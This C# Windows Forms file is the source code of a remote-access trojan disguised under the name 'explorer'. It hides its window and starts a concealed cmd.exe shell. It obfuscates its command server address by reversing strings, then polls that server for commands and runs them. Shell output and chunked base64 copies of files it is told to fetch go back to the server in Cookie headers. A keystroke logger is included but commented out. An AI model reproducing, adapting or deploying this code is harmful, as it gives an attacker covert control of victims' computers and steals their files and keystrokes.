using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
using System.Net;
using System.Net.Security;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Timers;

namespace explorer
{


    public partial class Form1 : Form
    {

        //[DllImport("user32.dll")]
        //public static extern short GetAsyncKeyState(Int32 i);

        // [DllImport("user32.dll")]
        // public static extern short GetAsyncKeyState(int vKey);

        public Form1()
        {
            InitializeComponent();
        }

        public static string strout = "";

        public static string strerr = "";

        public static string wholeFl = "";
        public static string strFls = "";

        public static bool fast = false;

        public static int Fcurr = 0;
        public static int Fend = 0;

        public static string UID = "";


        Process process = new Process();

        //ProcessStartInfo startInfo = new ProcessStartInfo(RversedStr("AAAAAexe=llehsreBopAA")); // powershell win 10

        ProcessStartInfo startInfo = new ProcessStartInfo(RversedStr("AAAexe=dmcAA")); //win7 

        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        static string AdrCom = "";

        private void Form1_Load(object sender, EventArgs e)
        {
            Init();
            try
            {
                // Thread th = new Thread(KeyThread);
                // th.Start();

                Thread m = new Thread(Str);
                m.Start();
              

            }
            catch (Exception)
            {

                Thread.Sleep(TimeSpan.FromMinutes(1));
                Environment.Exit(0);
                
            }
            
        }

        // public void KeyThread()
        // {

        //     StartKey();

        //     Thread.Sleep(rn.Next(5, 30));

        //     KeyThread();
        // }


        public void Str()
        {
            try 
            {
                Adr();
            }
            catch(Exception)
            {
                Environment.Exit(0);
            }
        }
        public void Adr()
        {
            //++++++++++++++++++++++++++++++++++ sec only .NET 4.5 (there's 4 )

            //ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
            //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            //ServicePointManager.SecurityProtocol = (SecurityProtocolType)768;
            //System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;

            HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(RversedStr("vres/vded/moc=ppaukoreh=duolc-rellortnoci//:ptthAAA")));
            
            req.Accept = "text/html,";
            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36";
            req.Headers.Add("Accept-Encoding", "gzip, deflate, br");

            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            using (Stream stream = resp.GetResponseStream())
            {
                StreamReader reader = new StreamReader(stream, Encoding.UTF8);

                AdrCom = reader.ReadToEnd();
                
            }

            Thread.Sleep(TimeSpan.FromSeconds(rn.Next(1,5)));
            SayH();
        }


        Random rn = new Random();

        public void SayH()
        {

            //ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
            //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
        
            HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(AdrCom));
           
            

            req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36";
            req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
            
            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();

            
            using (Stream stream = resp.GetResponseStream())
            {
                StreamReader reader = new StreamReader(stream, Encoding.UTF8);

                UID = reader.ReadToEnd();

            }

            
            Thread.Sleep(TimeSpan.FromSeconds(rn.Next(1, 60)));
            WaitForCom();
        }

        static string CmdStr = "";

        //public static WebClient client = new WebClient();
      
        //static HttpWebRequest req;

        public void WaitForCom()
        {


            //ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
            //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;


            HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(AdrCom));
            //client.BaseAddress = AdrCom;

            //client.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            //client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36");
            //client.Headers.Add("Accept-Encoding", "gzip, deflate, br");


            //client.Headers.Add("Cookie", ToBase(ToBase(UID + "+" + strout + "+" + strerr))); // COOKIE VAL UID***NRES***ERR


            //CmdStr = client.DownloadString(AdrCom);


            req.Headers.Clear();
            

            req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36";
            req.Headers.Add("Accept-Encoding", "gzip, deflate, br");

            
            req.Headers.Add("Cookie", ToBase(UID + "***" + strout + "***" + strerr + "***" + strFls)); // COOKIE VAL UID***NRES***ERR

            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            using (Stream stream = resp.GetResponseStream())
            {
                StreamReader reader = new StreamReader(stream, Encoding.UTF8);

                CmdStr = reader.ReadToEnd();


            }

            resp.Close();
            strout = "";
            strerr = "";
            strFls = "";

            
            ejri(CmdStr);

            if (fast)
                Thread.Sleep(TimeSpan.FromMilliseconds(rn.Next(400, 1500)));
            else
                Thread.Sleep(TimeSpan.FromSeconds(rn.Next(5, 30)));

            WaitForCom();
        }

        static string respUid = "";
        static string cmd = "";

        public void ejri(string resp)
        {

            respUid = "";
            
            respUid = FromBase(resp).Split('+')[0];
            if(!(cmd == FromBase(resp).Split('+')[1]))
            {
                cmd = FromBase(resp).Split('+')[1];
                if (respUid == UID || respUid == "all")
                {
                    switch (cmd)
                    {
                        case "":
                            break;
                        case "N":
                            break;
                        case "dumpkeys":
                            //strout = LogK;
                            strout = "zab :/";
                            LogK = "";
                            break;
                        default:
                            CustomCmd(cmd);
                            //process.StandardInput.WriteLine(cmd);
                            break;

                    }
                }

            }
            
        }

        public void CustomCmd(string cmd)
        {
            if (cmd.Contains("getcontent"))
            {
                GetContent(cmd.Split('_')[1]);
            }
            else if (cmd.Contains("setfast"))
            {
                fast = true;     
            }
            else if (cmd.Contains("setslow"))
            {
                fast = false;
            }
            else if (cmd.Contains("getfile_"))
            {
                GFB(cmd.Split('_')[1]);
            }
            
            else
            {
                process.StandardInput.WriteLine(cmd);
            }
        }


        long len;
        string length;
        string padding;
        public void GetContent(string path)
        {
            //string[] content = Directory.GetFileSystemEntries(path, "*", SearchOption.TopDirectoryOnly); //win 10 .NET 4.5
            string[] content = Directory.GetFileSystemEntries(path); //win 7 .NET 3.5

            foreach (string item in content)
            {
                try
                {
                    len = new System.IO.FileInfo(item).Length;
                    length = len.ToString();
                }
                catch (Exception)
                {
                    length = "F";
                }
                padding = "=";
                if(item.Length < 95)
                {
                    for (int i = 0; i < 100 - item.Length; i++)
                    {
                        padding += "=";
                    }
                }
                
                strout += item +"       " + padding + "size: " + length;
                strout += Environment.NewLine;
            }
        }

        public void GFB(string path)
        {
            
            byte[] fb = File.ReadAllBytes(path);


            wholeFl = Convert.ToBase64String(fb);
            



            if(wholeFl.Length > 10000)
            {
                for (int i = 0; i < wholeFl.Length / 5000;  i++)
                {
                    HttpSnd(wholeFl.Substring(i*5000, 5000));
                }
                //HttpSnd("test string");
                HttpSnd(wholeFl.Substring((wholeFl.Length / 5000 ) * 5000,wholeFl.Length - ( wholeFl.Length / 5000) * 5000) + Environment.NewLine + "endingOf_" + path + "==========================================" + Environment.NewLine);
            }

            else
            {
                HttpSnd("file_" + path + "_" +wholeFl);
                HttpSnd(Environment.NewLine + "file_" + path + "_"+"ending================================================================================"+Environment.NewLine);
            }


        }
        

        public void HttpSnd(string CToSnd)

        {
            //ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
            //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;


            HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(AdrCom));
           
            req.Headers.Clear();


            req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36";
            req.Headers.Add("Accept-Encoding", "gzip, deflate, br");


            req.Headers.Add("Cookie", ToBase(UID + "***" + "Sending File..." + "***" + " " + "***" + CToSnd)); // COOKIE VAL UID***NRES***ERR

            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            using (Stream stream = resp.GetResponseStream())
            {
                StreamReader reader = new StreamReader(stream, Encoding.UTF8);

                CmdStr = reader.ReadToEnd();

            }

            resp.Close();

            Thread.Sleep(rn.Next(200, 700));
        }


        public string ToBase(string str)
        {
            byte[] TToB = System.Text.Encoding.UTF8.GetBytes(str);
            return Convert.ToBase64String(TToB);
        }
        public string FromBase(string str)
        {
            try
            {
                byte[] ByteFromStr = Convert.FromBase64String(str);
                return Encoding.UTF8.GetString(ByteFromStr);
            }
            catch (Exception)
            {

                return "N+N";
            }
            

        }

        public static string RversedStr(string OriginalStr)
        {

            char[] charstr = OriginalStr.ToCharArray();
            Array.Reverse(charstr);
            string constructed = new string(charstr);

            constructed = constructed.Trim('A');
            constructed = constructed.Replace('B', 'w');
            constructed = constructed.Replace('=', '.');

            return constructed;

        }


        public void Init()
        {
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardInput = true;
            startInfo.RedirectStandardError = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            startInfo.StandardOutputEncoding = Encoding.GetEncoding(850);
            process.StartInfo = startInfo;
            process.OutputDataReceived += new DataReceivedEventHandler(readout);
            process.ErrorDataReceived += new DataReceivedEventHandler(readError);

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

        }

        public void readout(object sender, DataReceivedEventArgs e)
        {
            if(e.Data != null || e.Data =="") // ?dafaq xD
            {
                strout += e.Data;
                strout += Environment.NewLine;
            }
            

        }

        public void readError(object sender, DataReceivedEventArgs e)
        {
            strerr += e.Data;

        }

        string com = "";


        short key; ////////////////////////////////////////////////////////// CHENGED THIS TO GET KEYS TO WORK ON WIN7
        public static string LogK = "";





        ////  ==============================================  keysniff



        //public void StartKey(Object source, ElapsedEventArgs e)
        // public void StartKey()
        // {
        //     if (LogK.Length > 1000)
        //         LogK = "";

        //     for (int i = 0; i < 255; i++)
        //     {
        //         key = GetAsyncKeyState(i);
        //         if (key == 1 || key == -32767)
        //         {

        //             LogK += (VerifyK(i));
        //             break;
        //         }

              
        //     }
        // }


        // public string VerifyK(int code)
        // {
        //     String key = "";

        //     if (code == 8) key = "[<-]";
        //     else if (code == 9) key = "[TAB]";
        //     else if (code == 13) key = "[Enter]";
        //     else if (code == 19) key = "[Pause]";
        //     else if (code == 20) key = "[Caps Lock]";
        //     else if (code == 27) key = "[Esc]";
        //     else if (code == 32) key = " ";
        //     else if (code == 33) key = "[Page Up]";
        //     else if (code == 34) key = "[Page Down]";
        //     else if (code == 35) key = "[End]";
        //     else if (code == 36) key = "[Home]";
        //     else if (code == 37) key = "Left]";
        //     else if (code == 38) key = "[Up]";
        //     else if (code == 39) key = "[Right]";
        //     else if (code == 40) key = "[Down]";
        //     else if (code == 44) key = "[Print Screen]";
        //     else if (code == 45) key = "[Insert]";
        //     else if (code == 46) key = "[Delete]";
        //     else if (code == 48) key = "0";
        //     else if (code == 49) key = "1";
        //     else if (code == 50) key = "2";
        //     else if (code == 51) key = "3";
        //     else if (code == 52) key = "4";
        //     else if (code == 53) key = "5";
        //     else if (code == 54) key = "6";
        //     else if (code == 55) key = "7";
        //     else if (code == 56) key = "8";
        //     else if (code == 57) key = "9";
        //     else if (code == 65) key = "a";
        //     else if (code == 66) key = "b";
        //     else if (code == 67) key = "c";
        //     else if (code == 68) key = "d";
        //     else if (code == 69) key = "e";
        //     else if (code == 70) key = "f";
        //     else if (code == 71) key = "g";
        //     else if (code == 72) key = "h";
        //     else if (code == 73) key = "i";
        //     else if (code == 74) key = "j";
        //     else if (code == 75) key = "k";
        //     else if (code == 76) key = "l";
        //     else if (code == 77) key = "m";
        //     else if (code == 78) key = "n";
        //     else if (code == 79) key = "o";
        //     else if (code == 80) key = "p";
        //     else if (code == 81) key = "q";
        //     else if (code == 82) key = "r";
        //     else if (code == 83) key = "s";
        //     else if (code == 84) key = "t";
        //     else if (code == 85) key = "u";
        //     else if (code == 86) key = "v";
        //     else if (code == 87) key = "w";
        //     else if (code == 88) key = "x";
        //     else if (code == 89) key = "y";
        //     else if (code == 90) key = "z";
        //     else if (code == 91) key = "[Windows]";
        //     else if (code == 92) key = "[Windows]";
        //     else if (code == 93) key = "[List]";
        //     else if (code == 96) key = "0";
        //     else if (code == 97) key = "1";
        //     else if (code == 98) key = "2";
        //     else if (code == 99) key = "3";
        //     else if (code == 100) key = "4";
        //     else if (code == 101) key = "5";
        //     else if (code == 102) key = "6";
        //     else if (code == 103) key = "7";
        //     else if (code == 104) key = "8";
        //     else if (code == 105) key = "9";
        //     else if (code == 106) key = "*";
        //     else if (code == 107) key = "[+]";
        //     else if (code == 109) key = "-";
        //     else if (code == 110) key = ",";
        //     else if (code == 111) key = "/";
        //     else if (code == 112) key = "[F1]";
        //     else if (code == 113) key = "[F2]";
        //     else if (code == 114) key = "[F3]";
        //     else if (code == 115) key = "[F4]";
        //     else if (code == 116) key = "[F5]";
        //     else if (code == 117) key = "[F6]";
        //     else if (code == 118) key = "[F7]";
        //     else if (code == 119) key = "[F8]";
        //     else if (code == 120) key = "[F9]";
        //     else if (code == 121) key = "[F10]";
        //     else if (code == 122) key = "[F11]";
        //     else if (code == 123) key = "[F12]";
        //     else if (code == 144) key = "[Num Lock]";
        //     else if (code == 145) key = "[Scroll Lock]";
        //     else if (code == 160) key = "[Shift]";
        //     else if (code == 161) key = "[Shift]";
        //     else if (code == 162) key = "[Ctrl]";
        //     else if (code == 163) key = "[Ctrl]";
        //     else if (code == 164) key = "[Alt]";
        //     else if (code == 165) key = "[Alt]";
        //     else if (code == 187) key = "=";
        //     else if (code == 186) key = "ç";
        //     else if (code == 188) key = ",";
        //     else if (code == 189) key = "-";
        //     else if (code == 190) key = ".";
        //     else if (code == 192) key = "'";
        //     else if (code == 191) key = ";";
        //     else if (code == 193) key = "/";
        //     else if (code == 194) key = ".";
        //     else if (code == 219) key = "´";
        //     else if (code == 220) key = "]";
        //     else if (code == 221) key = "[";
        //     else if (code == 222) key = "~";
        //     else if (code == 226) key = "\\";
        //     //else key = "[" + code + "]";

        //     return key;
        // }

    }
}
